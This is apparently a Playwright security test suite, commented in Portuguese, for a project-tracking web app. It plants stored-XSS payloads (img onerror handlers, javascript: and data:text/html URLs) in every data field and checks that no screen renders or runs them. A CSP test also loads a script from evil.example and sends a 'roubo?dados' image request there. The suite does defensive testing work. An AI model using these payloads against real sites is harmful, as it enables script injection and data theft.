// Ataque real ao navegador: quem pode escrever grava HTML nos campos e espera o administrador abrir a tela.
const { test, expect, diasAtras } = require("./app");
const { test: testePuro, expect: esperar } = require("@playwright/test");

const marca = (campo) => `"'><img src=x data-xss="${campo}" onerror="window.__xss=(window.__xss||[]).concat('${campo}')">`;

const CAMPOS_QUE_PRECISAM_APARECER = [
  "ativa.titulo",
  "ativa.descricao",
  "ativa.cidade",
  "ativa.solicitante",
  "ativa.comentario.texto",
  "ativa.comentario.autor",
  "ativa.check.nome",
  "ativa.check.who",
  "ativa.edicao.autor",
  "ativa.edicao.de",
  "ativa.pdf.nome",
  "ativa.aviso.texto",
  "lixo.titulo",
  "arq.titulo",
  "usuario.nome",
  "hist.alvo",
  "backup.nome",
  "projetoasana.nome",
  "filtro.nome",
  "b2b.titulo",
  "fim.titulo",
];

// Os dashboards usam estes campos: provam que o veneno chegou até lá, e não só à esteira.
const CAMPOS_NO_DASHBOARD = ["ativa.cidade", "fim.cidade", "ativa.titulo"];

function demandaEnvenenada(id, extra = {}) {
  const v = (campo) => marca(`${id}.${campo}`);
  const agora = diasAtras(0);
  return {
    id: marca(`${id}.id`),
    titulo: v("titulo"),
    descricao: v("descricao"),
    tipo: "B2C",
    status: "novo",
    responsavel: "Vinicius",
    projetistasExtra: ["Matheus", v("projetistaExtra")],
    cidade: v("cidade"),
    cidadesExtra: [v("cidadeExtra")],
    solicitante: v("solicitante"),
    setorSolicitanteB2b: v("setor"),
    produtoB2b: v("produto"),
    segmentoB2c: v("segmento"),
    statusAtual: v("statusAtual"),
    chamadoOcomon: v("chamado"),
    osAniel: v("os"),
    dataChegada: diasAtras(40).slice(0, 10),
    dataFimPrevista: diasAtras(5).slice(0, 10),
    motivosAtrasoItens: [{ motivo: v("motivo"), dias: 3 }],
    comentarios: [{ id: v("comentario.id"), texto: `${v("comentario.texto")} https://x.com/"><b data-xss="link">`, autor: v("comentario.autor"), createdAt: agora, origem: "asana", mencoes: [v("mencao")] }],
    checklist: [
      { id: "c1", name: v("check.nome"), descricao: v("check.desc"), who: v("check.who"), dateInicio: diasAtras(9).slice(0, 10), date: diasAtras(1).slice(0, 10), moverPara: v("check.mover"), status: "pendente" },
      { id: v("check.id"), name: "segunda", dependeDe: "c1", who: "Matheus", dateInicio: v("check.data"), date: v("check.data2") },
    ],
    historicoStatus: [
      { status: v("hist.fase"), inicio: diasAtras(60), fim: diasAtras(50), observacao: v("hist.obsAntiga") },
      { status: "novo", inicio: diasAtras(40), fim: "", observacao: v("hist.obs") },
    ],
    historicoEdicoes: [
      { id: v("edicao.id"), tipo: "edicao", at: agora, by: { email: v("edicao.email"), autor: v("edicao.autor") }, alteracoes: [{ campo: v("edicao.campo"), label: v("edicao.label"), de: v("edicao.de"), para: v("edicao.para") }] },
      { tipo: "criacao", at: agora, by: { autor: "x" }, nota: v("edicao.nota") },
    ],
    historicoAlertas: [{ id: v("alerta.id"), at: agora, autor: v("alerta.autor"), email: v("alerta.email"), texto: v("alerta.texto"), kind: "coluna", status: v("alerta.status") }],
    custo: { temLevantamento: true, valorProjeto: 100, lancamento: { cabos: [{ id: v("cabo.id"), tipo: v("cabo.tipo"), metragem: v("cabo.metragem") }] }, observacao: v("custo.obs"), execucao: v("custo.execucao"), portasNovas: v("custo.portas"), trecho: v("custo.trecho") },
    pdfLevantamento: { id: v("pdf.id"), name: v("pdf.nome"), dataUrl: `data:text/html,${v("pdf.url")}`, uploadedAt: v("pdf.em") },
    imagens: [v("imagem")],
    anexos: [{ id: v("anexo.id"), nome: v("anexo.nome"), tipo: v("anexo.tipo"), path: v("anexo.path"), url: `javascript:${v("anexo.url")}`, enviadoPor: v("anexo.por") }],
    alertaSnooze: { kind: "coluna", status: v("snooze.status"), until: diasAtras(-3).slice(0, 10), dias: 3, at: agora, autor: v("snooze.autor") },
    editingBy: { email: v("presenca.email"), autor: v("presenca.autor"), since: agora },
    editingAt: agora,
    asanaTaskId: v("asana.id"),
    asana: { taskId: v("asana.task"), url: `javascript:window.__xss=["asana.url"]`, projetoGid: v("asana.projeto"), projetoNome: v("asana.nome"), createdBy: v("asana.por"), instrucoes: v("asana.instrucoes"), secao: v("asana.secao"), concluidaEm: agora },
    asanaAnteriores: [{ taskId: "1", url: `javascript:window.__xss=["anterior.url"]`, projetoNome: v("anterior.nome") }, { taskId: "2", url: `https://x.com/"><b data-xss="anterior.https">`, projetoNome: v("anterior.nome2") }],
    asanaAviso: { tipo: "concluida", texto: v("aviso.texto"), taskId: v("aviso.task"), em: agora, chave: v("aviso.chave") },
    createdAt: agora,
    updatedAt: agora,
    ...extra,
  };
}

/** Abre tudo o que mostra dado gravado por outra pessoa, e anota em qual tela o HTML virou elemento de verdade. */
async function percorrerTelas(page) {
  return page.evaluate(async () => {
    const achados = [];
    const excecoes = [];
    const vistos = new Set();
    const novosPorTela = {};
    const noDashboard = new Set();
    const dormir = (ms) => new Promise((r) => setTimeout(r, ms));
    const anotarVistos = (texto) => {
      for (const m of String(texto).matchAll(/data-xss="([^"]+)"/g)) vistos.add(m[1]);
    };
    const conferir = (tela) => {
      const antes = new Set(vistos);
      anotarVistos(document.body.textContent);
      for (const el of document.querySelectorAll("*")) for (const a of el.attributes) anotarVistos(a.value);
      const novos = [...vistos].filter((v) => !antes.has(v));
      if (novos.length) novosPorTela[tela] = [...(novosPorTela[tela] || []), ...novos];
      for (const el of document.querySelectorAll("[data-xss], img[src='x'], [onerror], [onload], [onclick], [onmouseover]")) {
        achados.push(`${tela}: ${el.getAttribute("data-xss") || el.outerHTML.slice(0, 120)}`);
        el.remove();
      }
    };
    const passo = async (tela, fn) => {
      try {
        await fn();
        await dormir(60);
      } catch (e) {
        excecoes.push(`${tela}: ${e.message}`);
      }
      conferir(tela);
    };
    const ids = state.demandas.map((d) => d.id);

    await passo("esteira", () => renderBoard());
    await passo("esteira b2b", () => {
      if (typeof setActiveEsteiraCanal === "function") setActiveEsteiraCanal("b2b");
      renderBoard();
    });
    await passo("alertas", () => renderInboxAlertas("operacional"));
    await passo("alertas b2b", () => renderInboxAlertas("b2b"));
    for (const id of ids) {
      await passo("janela do projeto", () => openDemandaModal(id));
      await passo("comentários", () => renderComentariosList());
      await passo("checklist", () => {
        renderChecklistEditor();
        renderChecklistGantt();
      });
      await passo("linha do tempo", () => {
        renderTimeline(state.demandas.find((d) => d.id === id));
        renderTimelineResumo();
      });
      await passo("custo e pdf", () => {
        renderPdfLevantamentoPreview();
        renderLancamentoCabos();
      });
      await passo("asana", () => {
        setAsanaUiOverride(null);
        syncDemAsanaUi();
        syncAsanaAvisoBanner();
      });
      await passo("leitura das seções", () => {
        for (const botao of document.querySelectorAll("[data-sec-toggle], .dem-secao__toggle, [data-dem-secao]")) botao.click();
      });
      await passo("histórico de edição", () => abrirHistoricoEdicaoModal());
      await passo("fechar", () => {
        document.querySelectorAll("dialog[open]").forEach((d) => d.close());
      });
    }
    await passo("lixeira", () => abrirLixeiraModal("lixeira"));
    await passo("arquivados", () => abrirLixeiraModal("arquivados"));
    await passo("fechar", () => document.querySelectorAll("dialog[open]").forEach((d) => d.close()));
    await passo("metas", () => abrirMetasEtapaModal());
    await passo("fechar", () => document.querySelectorAll("dialog[open]").forEach((d) => d.close()));
    await passo("dashboard", async () => {
      document.querySelector('[data-tab="dashboard"]')?.click();
      renderDashboard();
      await dormir(200);
    });
    await passo("dashboard indicadores", async () => {
      for (const render of ["renderDashCidades", "renderKpiGeralPorTipo", "renderKpiProjetistas", "renderDashTempoTable", "renderDashTempoB2bTable", "renderDashIndicadoresB2c", "renderDashIndicadoresB2b", "renderDashGeoProjetosTable"]) {
        try {
          window[render]?.();
        } catch (e) {
          excecoes.push(`${render}: ${e.message}`);
        }
      }
      await dormir(200);
    });
    await passo("dashboard detalhes", async () => {
      const painel = document.getElementById("panelDashboard");
      const nomeDaCidade = state.demandas.find((d) => d.titulo.includes("ativa.titulo"))?.cidade;
      setDashPjDrill("Vinicius");
      openDashPjTipos("Vinicius");
      setDashCidadesDrillRegional(nomeDaCidade);
      // Cada lista aberta substitui a anterior na mesma janela: anota o que aparece depois de cada clique.
      const coletar = () => {
        for (const area of [painel, ...document.querySelectorAll("dialog[open]")]) {
          for (const m of area.textContent.matchAll(/data-xss="([^"]+)"/g)) noDashboard.add(m[1]);
          for (const el of area.querySelectorAll("*")) for (const a of el.attributes) for (const m of a.value.matchAll(/data-xss="([^"]+)"/g)) noDashboard.add(m[1]);
        }
      };
      openDashGeoProjetosLista("cidade", nomeDaCidade, "todos");
      coletar();
      for (const seletor of ["[data-dash-geo-list]", "[data-dash-tipo]", "[data-dash-pj]", "[data-dash-geo-key]"]) {
        document.querySelectorAll(seletor).forEach((el, i) => {
          if (i < 3) {
            el.click();
            coletar();
          }
        });
      }
      await dormir(150);
      coletar();
    });
    await passo("fechar", () => document.querySelectorAll("dialog[open]").forEach((d) => d.close()));
    document.querySelector('[data-tab="esteira"]')?.click();
    await passo("usuários", async () => {
      openUsuariosModal();
      renderUsuariosPanel();
      await dormir(100);
    });
    await passo("histórico de acessos", async () => {
      await carregarHistoricoAcessos();
      renderHistoricoAcessos();
    });
    await passo("menus de usuário", () => {
      document.querySelectorAll("#modalUsuarios [aria-haspopup], #modalUsuarios .usuario-menu__btn").forEach((b, i) => {
        if (i < 3) b.click();
      });
    });
    await passo("fechar", () => document.querySelectorAll("dialog[open]").forEach((d) => d.close()));
    await passo("backups", async () => {
      abrirBackupsModal();
      await dormir(150);
    });
    await passo("fechar", () => document.querySelectorAll("dialog[open]").forEach((d) => d.close()));
    await passo("envio ao asana", async () => {
      renderAsanaProjetosOpcoes([{ gid: `"'><img src=x data-xss="projetoasana.gid">`, nome: `"'><img src=x data-xss="projetoasana.nome">` }]);
      await dormir(50);
    });
    await passo("avisos", () => notificarAvisosAsanaNovos());
    await passo("filtros salvos", () => {
      syncFiltrosSalvosUi();
      document.getElementById("btnFiltrosSalvos")?.click();
    });
    await passo("menções", () => {
      openDemandaModal(ids[0]);
      const caixa = document.getElementById("demComentarioNovo");
      caixa.value = "@";
      caixa.selectionStart = caixa.selectionEnd = 1;
      caixa.dispatchEvent(new Event("input", { bubbles: true }));
    });
    await passo("fechar", () => document.querySelectorAll("dialog[open]").forEach((d) => d.close()));
    return { achados, excecoes, xss: window.__xss || [], vistos: [...vistos], noDashboard: [...noDashboard], novosPorTela, contagem: { diarias: state.diarias?.length, lixeira: state.lixeira?.length, demandas: state.demandas?.length } };
  });
}

test.describe("HTML gravado nos campos", () => {
  // Sem CSP de propósito: aqui se prova o escape sozinho. A CSP é a segunda barreira, testada abaixo.
  test.use({ bypassCSP: true });

  test("nunca vira elemento nem executa, em nenhuma tela", async ({ app: { page } }) => {
    test.setTimeout(90000);
    const email = marca("usuario.email");
    await page.evaluate(() => {
      window.__marca = (c) => `"'><img src=x data-xss="${c}" onerror="window.__xss=(window.__xss||[]).concat('${c}')">`;
    });
    await page.evaluate(
      ({ email, dem, excluida, arquivada, b2b, fim }) => {
        const marcaNome = window.__marca;
        DemandasAuth.currentUser = () => ({ email: "vinicius.morais@soumaster.com.br", displayName: marcaNome("auth.nome") });
        DemandasRoles.definirAdminPrincipal("vinicius.morais@soumaster.com.br");
        DemandasRoles.setRolesMap({ "vinicius.morais@soumaster.com.br": "admin", [email]: "projetista", "bia@x.com": "projetista" });
        DemandasRoles.setNamesMap({ [email]: marcaNome("usuario.nome"), "bia@x.com": marcaNome("bia.nome") });
        DemandasRoles.setRegionalsMap({ [email]: marcaNome("usuario.regional") });
        DemandasRoles.setDisabledMap({});
        DemandasRoles.setPurgedMap({});
        window.Chart = class {
          constructor() {
            this.data = { datasets: [] };
            this.options = {};
          }
          destroy() {}
          update() {}
          resize() {}
          static register() {}
        };
        window.Chart.defaults = { font: {}, animation: {}, plugins: { legend: { labels: {} }, tooltip: {} } };
        DemandasNuvem.listarBackups = async () => [{ name: `${marcaNome("backup.nome")}.json`, metadata: { size: 10 }, created_at: marcaNome("backup.em") }];
        DemandasNuvem.ultimoBackup = async () => ({ em: marcaNome("backup.ultimo"), autor: marcaNome("backup.autor"), arquivo: marcaNome("backup.arquivo"), totalDemandas: marcaNome("backup.total"), motivo: marcaNome("backup.motivo") });
        DemandasNuvem.chamar = async (nome) => (nome === "listarContasLogin" ? { data: { contas: {} } } : { data: {} });
        persistenceApi = {
          mode: "nuvem",
          acessosCarregados: () => true,
          acessoNegado: () => false,
          loadAccessHistory: async () => [{ id: marcaNome("hist.id"), em: new Date().toISOString(), por: marcaNome("hist.por"), alvo: marcaNome("hist.alvo"), acao: "papel", de: marcaNome("hist.de"), para: marcaNome("hist.para") }],
          upsertDemanda: async () => {},
          patchDemandaPresence: async () => {},
          persistMeta: async () => {},
          persistMetaFields: async () => {},
        };
        applyLoadedState({
          demandas: [dem, excluida, arquivada, b2b, fim],
          diarias: [{ id: marcaNome("diaria.id"), titulo: marcaNome("diaria.titulo"), descricao: marcaNome("diaria.desc"), responsavel: "Vinicius" }],
          projetistas: { Vinicius: { texto: marcaNome("projetista.texto"), demandaId: marcaNome("projetista.demanda"), desde: marcaNome("projetista.desde") } },
          metasEtapa: { operacional: { novo: marcaNome("meta.valor") } },
          filtrosSalvos: { "vinicius,morais@soumaster,com,br": [{ id: marcaNome("filtro.id"), nome: marcaNome("filtro.nome"), linha: "operacional", resumo: marcaNome("filtro.resumo") }] },
        });
      },
      {
        email: email.toLowerCase(),
        dem: demandaEnvenenada("ativa"),
        excluida: demandaEnvenenada("lixo", { excluidoEm: diasAtras(1), excluidoPor: marca("lixo.por") }),
        arquivada: demandaEnvenenada("arq", { arquivadoEm: diasAtras(1), arquivadoPor: marca("arq.por") }),
        b2b: demandaEnvenenada("b2b", { tipo: "B2B", linhaEsteira: "b2b", produtoB2b: marca("b2b.produto2"), setorSolicitanteB2b: marca("b2b.setor2") }),
        fim: demandaEnvenenada("fim", { status: "conclusao", dataTermino: diasAtras(1).slice(0, 10), valorProjetoRealizado: 500 }),
      },
    );

    const { achados, excecoes, xss, vistos, noDashboard, novosPorTela, contagem } = await percorrerTelas(page);
    if (process.env.MOSTRAR_VENENO) console.log(JSON.stringify({ novosPorTela, noDashboard, contagem, excecoes: [...new Set(excecoes)], achados: [...new Set(achados)] }, null, 0));
    for (const campo of CAMPOS_NO_DASHBOARD) expect(noDashboard, `o campo ${campo} não chegou ao dashboard`).toContain(campo);
    // Sem isto, um teste que não chegasse às telas passaria sem provar nada.
    for (const campo of CAMPOS_QUE_PRECISAM_APARECER) expect(vistos, `o campo ${campo} não chegou a nenhuma tela`).toContain(campo);
    expect([...new Set(achados)], "HTML virou elemento").toEqual([]);
    expect(xss, "script executou").toEqual([]);
    expect([...new Set(excecoes)], "dado estranho derrubou uma tela").toEqual([]);
  });

  test("link do Asana com javascript: não fica clicável", async ({ app: { page } }) => {
    const hrefs = await page.evaluate(() => {
      const d = migrateDemanda({ id: "p9", titulo: "T", asanaTaskId: "1", asana: { taskId: "1", url: "javascript:window.__xss=1" }, asanaAnteriores: [{ taskId: "2", url: "JaVaScRiPt:window.__xss=1" }, { taskId: "3", url: "data:text/html,x" }] });
      state.demandas.push(d);
      openDemandaModal("p9");
      syncDemAsanaUi();
      return [...document.querySelectorAll("#demAsanaAnteriores a, #demAsanaLink")].map((a) => a.getAttribute("href")).filter(Boolean);
    });
    for (const href of hrefs) expect(href).toMatch(/^https:/);
  });

  test("PDF com endereço que não é PDF é descartado", async ({ app: { page } }) => {
    const urls = await page.evaluate(() => [
      normalizePdfLevantamento({ name: "a", dataUrl: "javascript:alert(1)" }).dataUrl,
      normalizePdfLevantamento({ name: "a", dataUrl: 'data:application/pdf;base64,AA"><img src=x>' }).dataUrl,
      normalizePdfLevantamento({ name: "a", dataUrl: "data:text/html;base64,AAAA" }).dataUrl,
      normalizePdfLevantamento({ name: "a", dataUrl: "data:application/pdf;base64,AAAA" }).dataUrl,
    ]);
    expect(urls).toEqual(["", "", "", "data:application/pdf;base64,AAAA"]);
  });
});

test("console: usar o app e provocar falhas não escreve dados da equipe nem dos projetos", async ({ app: { page, saidaConsole } }) => {
  await page.evaluate(async () => {
    persistenceApi = {
      mode: "nuvem",
      upsertDemanda: async () => {
        throw new Error("permission denied Rota IJA x SRS matheus.costa@x.com");
      },
      persistMeta: async () => {
        throw new Error("erro com Hospital Central");
      },
      patchDemandaPresence: async () => {
        throw new Error("erro alberto.soares@x.com");
      },
    };
    persistenceReady = true;
    saveState({ demanda: state.demandas[0] });
    saveState({ meta: true });
    saveState({ presence: { id: "p1", editingBy: { email: "x" } } });
    await new Promise((r) => setTimeout(r, 50));
    openDemandaModal("p1");
    document.querySelectorAll("dialog[open]").forEach((d) => d.close());
    document.querySelector('[data-tab="dashboard"]')?.click();
  });
  await page.waitForTimeout(200);
  expect(saidaConsole.filter((l) => l.startsWith("[Projetos]")).length, "as falhas foram registradas").toBeGreaterThanOrEqual(3);
});

testePuro.describe("barreira do navegador (CSP do firebase.json aplicada)", () => {
  testePuro("HTML injetado à força não executa, e script de fora não carrega", async ({ page }) => {
    await page.route(/gstatic|jsdelivr|cdnjs|googleapis|supabase\.co|evil\.example/, (r) => r.fulfill({ contentType: "text/javascript", body: "window.__xss = ['carregou de fora'];" }));
    await page.goto("/index.html");
    await page.waitForFunction(() => typeof window.applyLoadedState === "function");
    const violacoes = await page.evaluate(async () => {
      const vistas = [];
      document.addEventListener("securitypolicyviolation", (e) => vistas.push(e.effectiveDirective));
      const raiz = document.createElement("div");
      document.body.appendChild(raiz);
      raiz.innerHTML = `<img src="x" onerror="window.__xss=['onerror']"><svg onload="window.__xss=['onload']"></svg><a id="linkJs" href="javascript:window.__xss=['javascript:']">x</a>`;
      document.getElementById("linkJs").click();
      const scriptInline = document.createElement("script");
      scriptInline.textContent = "window.__xss=['inline']";
      document.head.appendChild(scriptInline);
      for (const src of ["https://evil.example/x.js", "https://cdn.jsdelivr.net/npm/lodash@4/lodash.min.js", "https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"]) {
        const s = document.createElement("script");
        s.src = src;
        document.head.appendChild(s);
      }
      try {
        new Image().src = "https://evil.example/roubo?dados=1";
      } catch (_) {}
      await new Promise((r) => setTimeout(r, 300));
      return vistas;
    });
    esperar(await page.evaluate(() => window.__xss)).toBeUndefined();
    for (const diretiva of ["script-src-attr", "script-src-elem", "img-src"]) esperar(violacoes, diretiva).toContain(diretiva);
  });
});

testePuro("visitante sem login: nada da equipe no console nem nas variáveis globais", async ({ page }) => {
  const saida = [];
  page.on("console", (m) => saida.push(m.text()));
  await page.route(/gstatic|jsdelivr|cdnjs|googleapis|supabase\.co/, (r) => r.abort());
  await page.goto("/index.html");
  await page.waitForFunction(() => typeof window.applyLoadedState === "function");
  const globais = await page.evaluate(() => ({ email: window.DEMANDAS_ADMIN_EMAIL, seed: window.DEMANDAS_ROLES_SEED, papeis: DemandasRoles.getRolesMap(), copia: DemandasNuvem.loadLocal() }));
  esperar(globais).toEqual({ email: "", seed: {}, papeis: {}, copia: null });
  esperar(saida.join("\n")).not.toContain("soumaster");
});

testePuro("restos da versão antiga são apagados do navegador", async ({ page }) => {
  await page.route(/gstatic|jsdelivr|cdnjs|googleapis|supabase\.co/, (r) => r.abort());
  await page.goto("/index.html");
  await page.waitForFunction(() => typeof window.applyLoadedState === "function");
  const nomes = await page.evaluate(async () => {
    await new Promise((ok, erro) => {
      const pedido = indexedDB.open("firestore/[DEFAULT]/demproj-fdeac/main");
      pedido.onsuccess = () => {
        pedido.result.close();
        ok();
      };
      pedido.onerror = erro;
    });
    await DemandasNuvem.init({ onData() {}, onStatus() {}, onRoles() {} }).catch(() => {});
    await new Promise((r) => setTimeout(r, 200));
    return (await indexedDB.databases()).map((d) => d.name);
  });
  esperar(nomes.filter((n) => n.startsWith("firestore"))).toEqual([]);
});
